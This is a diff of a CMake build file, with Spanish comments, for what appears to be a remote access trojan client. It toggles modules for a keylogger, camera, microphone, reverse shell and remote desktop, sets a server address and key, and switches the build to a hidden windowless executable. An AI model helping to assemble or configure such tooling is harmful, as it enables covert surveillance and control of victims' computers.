@@ -29,11 +29,11 @@ set(SRCS main.cpp
 )
 
 option(USE_TEST_MOD "Mod prueba" OFF)
-option(USE_DEBUG "Debug" ON)
+option(USE_DEBUG "Debug" OFF)
 
 option(USE_CAM "Mod Camara" OFF)
 option(USE_SCAN "Mod Escaner Red" OFF)
-option(USE_FM "Mod Admin Archivos" ON)
+option(USE_FM "Mod Admin Archivos" OFF)
 option(USE_FUN "Mod Bromas" OFF)
 option(USE_INFO "Mod Informacion" OFF)
 option(USE_KL "Mod Keylogger" OFF)
@@ -41,16 +41,16 @@ option(USE_MIC "Mod Microfono" OFF)
 option(USE_RD "Mod Escritorio Remoto" OFF)
 option(USE_RP "Mod Proxy Inversa" OFF)
 option(USE_WM "Mod Admin Ventanas" OFF)
-option(USE_SHELL "Mod Shell Inversa" ON)
+option(USE_SHELL "Mod Shell Inversa" OFF)
 option(USE_PM "Mod Admin Procesos" OFF)
 
 set(SRV_ADDR "127.0.0.1" CACHE STRING "Direccion Servidor")
 set(SRV_ADDR_PORT "65500" CACHE STRING "Puerto de conexion")
 set(SRV_ENC_KEY "eW1n" CACHE STRING "Llave de cifrado")
 
-#configure_file(${CMAKE_SOURCE_DIR}/config.hpp.in
-#                ${CMAKE_BINARY_DIR}/config.hpp
-#                @ONLY)
+configure_file(${CMAKE_SOURCE_DIR}/config.hpp.in
+                ${CMAKE_BINARY_DIR}/config.hpp
+                @ONLY)
 
 if(NOT USE_DEBUG)
     message("[!] Reduciendo dependencias...")
@@ -79,8 +79,8 @@ if(USE_INFO)
     add_executable(cliente WIN32 ${SRCS} ${SRC_INFO_MOD})
 else()
     message("Clean Version :v")
-    add_executable(cliente ${SRCS})
-    #add_executable(cliente WIN32 ${SRCS})
+    #add_executable(cliente ${SRCS})  <-- Debug con ventana
+    add_executable(cliente WIN32 ${SRCS})
 endif()
 
 target_link_libraries(cliente PRIVATE mfuuid)
